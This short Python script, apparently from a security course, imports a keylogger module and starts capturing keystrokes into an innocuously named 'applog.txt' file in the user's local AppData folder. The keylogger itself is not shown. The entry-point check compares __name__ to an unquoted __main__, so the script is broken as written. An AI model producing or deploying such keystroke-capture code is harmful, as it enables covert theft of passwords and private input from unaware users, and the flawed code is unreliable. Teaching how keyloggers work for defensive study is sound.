import os
from SRA211.Keyloggers import keylogger

def main():
    log_dir = os.environ['localappdata']
    log_name = 'applog.txt'

    keylogger.getKeystrokes(log_dir, log_name)

if __name__==__main__:
        main()